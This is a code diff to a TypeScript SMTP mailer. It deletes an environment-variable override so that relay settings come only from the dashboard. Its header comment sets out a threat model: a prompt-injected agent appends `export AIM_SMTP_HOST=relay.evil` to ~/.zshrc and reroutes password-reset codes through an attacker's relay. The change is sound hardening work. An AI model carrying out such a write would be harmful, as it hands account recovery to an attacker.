@@ -14,30 +14,28 @@
  * and the password read from the OS credential store (lib/smtp-credential). gmail →
  * Gmail SMTP, icloud → iCloud SMTP, and so on — no manual server config.
  *
- * Resolution is PER FIELD, not all-or-nothing. For each field:
- *   1. The AIM_SMTP_* env var for THAT field, when set — an independent override.
- *   2. Auto-config — detectProvider(accountEmail) + the stored app-password.
- *   3. The merged result must still be COMPLETE (host+port+user+pass). If it is not,
- *      the mailer is DORMANT: sendCodeEmail() is a no-op {ok:false, skipped:true} and
+ * THE DASHBOARD IS THE ONLY SOURCE (TRDD-CC9PY337, USER directive 2026-07-17). There is no
+ * env path. The relay is configured at Settings -> Hosts -> Recovery Email, which derives the
+ * SMTP settings from the email domain and stores the password in the OS keychain.
+ *
+ * There USED to be an AIM_SMTP_HOST/PORT/USER/PASS/FROM/SECURE override. It is DELETED — not
+ * gated, not validated: deleted. It was an account-takeover vector, and the vector was the
+ * environment the server INHERITS, not a remote attacker. Agents run as the SAME UID as the
+ * server, so a prompt-injected agent could append `export AIM_SMTP_HOST=relay.evil` to
+ * ~/.zshrc — a low-suspicion write — and every password-reset code would then transit an
+ * attacker's relay after the next restart, silently, with the dashboard still showing the
+ * owner's own provider. A stale export from a debugging session did the same by accident.
+ *
+ * Gating it on NODE_ENV was considered and rejected: that still READS the var in development,
+ * and dev machines run agents too. Deleting the read closes the vector in both modes. Nothing
+ * legitimate is lost — the dashboard configures every field this override could reach.
+ *
+ * Resolution:
+ *   1. Auto-config — detectProvider(accountEmail) + the stored app-password.
+ *   2. Not configured -> DORMANT: sendCodeEmail() is a no-op {ok:false, skipped:true} and
  *      the caller falls back to the console channel. So the feature builds, tests, and
  *      ships with NO credentials, lighting up the moment the owner adds them. Email is
  *      one recovery channel among three (console, email, passkey), never a hard dep.
- *
- * Every AIM_SMTP_* variable is INDEPENDENT: setting one overrides exactly its own field
- * and leaves the rest to the dashboard-configured relay. `AIM_SMTP_HOST=relay.internal`
- * alone now means "same account, different host". It previously meant NOTHING — the env
- * path required all four together, so a lone override was silently discarded while the
- * operator believed it had taken effect.
- *
- * Completeness is still enforced on the MERGED config, which preserves the property the
- * all-or-nothing shape was protecting: a partial override with no stored relay behind it
- * is incomplete, so it stays dormant rather than half-enabling a channel that would fail
- * at send time.
- *
- * Env vars (each optional and independent):
- *   AIM_SMTP_HOST, AIM_SMTP_PORT, AIM_SMTP_USER, AIM_SMTP_PASS, AIM_SMTP_FROM
- *   (defaults to the effective user), AIM_SMTP_SECURE ('true'/'false'; defaults to the
- *   stored value, or true on port 465 / STARTTLS elsewhere when the port is overridden).
  */
 import nodemailer from 'nodemailer'
 import { detectProvider } from './email-providers'
@@ -52,51 +50,6 @@ export interface MailerConfig {
   pass: string
   from: string
   secure: boolean
-}
-
-/** The one port that means implicit TLS on connect; every other port means STARTTLS. */
-const IMPLICIT_TLS_PORT = 465
-
-/**
- * The per-field SMTP override read from the environment. Each AIM_SMTP_* var contributes
- * ONLY its own field; an unset var contributes nothing and leaves that field to the
- * dashboard config.
- *
- * THROWS on a malformed value rather than dropping it. A typo'd AIM_SMTP_PORT must not
- * quietly disable the recovery channel while the operator believes it is live — absence
- * is a legitimate "not configured", but a wrong value is a bug they need to see. This is
- * the fail-fast rule: the override either works as written or the process says why.
- */
-function envOverride(): Partial<MailerConfig> {
-  const ov: Partial<MailerConfig> = {}
-
-  const host = process.env.AIM_SMTP_HOST?.trim()
-  if (host) ov.host = host
-  const user = process.env.AIM_SMTP_USER?.trim()
-  if (user) ov.user = user
-  const pass = process.env.AIM_SMTP_PASS
-  if (pass) ov.pass = pass
-  const from = process.env.AIM_SMTP_FROM?.trim()
-  if (from) ov.from = from
-
-  const portRaw = process.env.AIM_SMTP_PORT?.trim()
-  if (portRaw) {
-    const port = Number(portRaw)
-    if (!Number.isInteger(port) || port <= 0 || port > 65535) {
-      throw new Error(`AIM_SMTP_PORT="${portRaw}" is not a valid TCP port (1-65535)`)
-    }
-    ov.port = port
-  }
-
-  const secureRaw = process.env.AIM_SMTP_SECURE?.trim()
-  if (secureRaw) {
-    if (secureRaw !== 'true' && secureRaw !== 'false') {
-      throw new Error(`AIM_SMTP_SECURE="${secureRaw}" must be exactly "true" or "false"`)
-    }
-    ov.secure = secureRaw === 'true'
-  }
-
-  return ov
 }
 
 /**
@@ -130,33 +83,12 @@ function autoConfig(accountEmail: string): MailerConfig | null {
 }
 
 /**
- * Resolve the effective SMTP config: the stored/auto-config for `accountEmail` (the owner's
- * registered address) with each env var layered over its own field, or null when the merged
- * result is incomplete. Pass the registered email whenever you want the stored relay as the
- * base — without it, only the env vars can supply a field, so they must supply all four.
- *
- * Throws if an env var is present but malformed (see envOverride).
+ * Resolve the SMTP config for `accountEmail` (the owner's registered address), or null when no
+ * relay is configured. The dashboard is the only source — there is no env path (TRDD-CC9PY337);
+ * without an account email there is nothing to resolve.
  */
 export function getMailerConfig(accountEmail?: string): MailerConfig | null {
-  const base = accountEmail ? autoConfig(accountEmail) : null
-  const ov = envOverride()
-
-  const host = ov.host ?? base?.host
-  const port = ov.port ?? base?.port
-  const user = ov.user ?? base?.user
-  const pass = ov.pass ?? base?.pass
-  // Completeness is checked on the MERGE, not on either source: a lone override with no
-  // stored relay behind it is still "not configured" and stays dormant.
-  if (!host || !port || !user || !pass) return null
-
-  // `secure` tracks the EFFECTIVE port unless stated outright. Keeping the stored value
-  // when the port was NOT overridden preserves a provider's known-correct setting; deriving
-  // it when the port WAS overridden is what stops AIM_SMTP_PORT=465 from inheriting a
-  // stored STARTTLS and failing the handshake — the one field that cannot be varied
-  // independently of the port without producing a config that never connects.
-  const secure = ov.secure ?? (base && ov.port === undefined ? base.secure : port === IMPLICIT_TLS_PORT)
-
-  return { host, port, user, pass, from: ov.from ?? base?.from ?? user, secure }
+  return accountEmail ? autoConfig(accountEmail) : null
 }
 
 export function isMailerConfigured(accountEmail?: string): boolean {
